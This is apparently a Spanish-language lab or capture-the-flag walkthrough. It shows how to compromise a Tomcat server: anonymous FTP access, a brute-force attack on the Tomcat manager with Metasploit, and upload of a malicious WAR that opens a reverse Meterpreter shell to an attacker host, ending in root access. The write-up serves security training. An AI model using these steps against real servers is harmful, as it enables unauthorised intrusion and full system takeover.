# Pn

## Descripción

Laboratorio donde se accederá con unas credenciales al panel interno de Apache Tomcat para posteriormente obtener acceso al servidor.

---

# Enumeración

Primero se realiza un escaneo con **Nmap** para identificar los servicios disponibles.

```bash
nmap -sC -sV 172.17.0.2
```

Resultado:

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-18 11:53 -0400
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon:
|_-rw-r--r--    1 0        0              74 Apr 19  2024 tomcat.txt

8080/tcp open  http    Apache Tomcat 9.0.88
|_http-title: Apache Tomcat/9.0.88
|_http-favicon: Apache Tomcat
```

Se observa que están abiertos los siguientes puertos:

- **21 (FTP)**
- **8080 (Apache Tomcat)**

Además, Nmap indica que el servidor FTP permite autenticación como **anonymous**.

---

# Acceso al FTP

Se inicia sesión utilizando el usuario `anonymous`.

```bash
ftp 172.17.0.2
```

```text
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)

Name (172.17.0.2:kali): Anonymous
331 Please specify the password.
Password:
230 Login successful.
```

Una vez dentro se listan los archivos disponibles.

```text
ftp> ls -a

drwxr-xr-x    1 0        107          4096 Apr 19  2024 .
drwxr-xr-x    1 0        107          4096 Apr 19  2024 ..
-rw-r--r--    1 0        0              74 Apr 19  2024 tomcat.txt
```

Se observa un archivo llamado **tomcat.txt**.

Como el cliente FTP no permite usar `cat`, se descarga a la máquina local.

```text
ftp> get tomcat.txt
```

---

# Revisando el archivo

Se visualiza el contenido descargado.

```bash
cat tomcat.txt
```

```text
Hello tomcat, can you configure the tomcat server? I lost the password...
```

El mensaje hace pensar que será necesario encontrar las credenciales del servidor Tomcat.

---

# Creación del diccionario

Se crea un pequeño diccionario con credenciales comunes para Tomcat.

```bash
nano credenciales.txt
```

Contenido:

```text
admin
tomcat
s3cr3t
```

La idea es utilizar este archivo junto con Metasploit para probar distintas combinaciones de usuario y contraseña.

---

# Fuerza bruta con Metasploit

Se utiliza el módulo:

```text
auxiliary(scanner/http/tomcat_mgr_login)
```

Configuración:

```text
set PASS_FILE credenciales.txt
set USER_FILE credenciales.txt
set RHOST 172.17.0.2
exploit
```

Resultado:

```text
[+] 172.17.0.2:8080 - Login Successful: tomcat:s3cr3t
```

Se descubre que las credenciales válidas son:

```text
Usuario: tomcat
Contraseña: s3cr3t
```

---

# Explotación de Tomcat

Con unas credenciales válidas es posible utilizar el módulo de Metasploit que sube un archivo **.war** malicioso al servidor.

Se carga el exploit:

```text
use exploit/multi/http/tomcat_mgr_upload
```

Configuración:

```text
set HttpUsername tomcat
set HttpPassword s3cr3t
set RHOST 172.17.0.2
set RPORT 8080
set LHOST 172.17.0.1
```

Finalmente se ejecuta:

```text
exploit
```

Resultado:

```text
[*] Started reverse TCP handler on 172.17.0.1:4444
[*] Uploading and deploying...
[*] Executing...
[*] Sending stage...
[*] Meterpreter session 1 opened
```

Se obtiene una sesión **Meterpreter**.

---

# Acceso al sistema

Desde Meterpreter se abre una shell.

```text
meterpreter > shell
```

Luego se verifica el usuario actual.

```bash
whoami
```

Resultado:

```text
root
```

---

# Conclusión

Durante este laboratorio se realizó el siguiente proceso:

1. Enumeración con **Nmap**.
2. Acceso al servicio **FTP** mediante el usuario `anonymous`.
3. Descarga de un archivo con una pista sobre Tomcat.
4. Creación de un pequeño diccionario de credenciales.
5. Ataque de fuerza bruta con el módulo `tomcat_mgr_login`.
6. Obtención de las credenciales `tomcat:s3cr3t`.
7. Uso del módulo `tomcat_mgr_upload` para subir un archivo `.war` malicioso.
8. Apertura de una sesión **Meterpreter** y obtención de acceso como **root**.
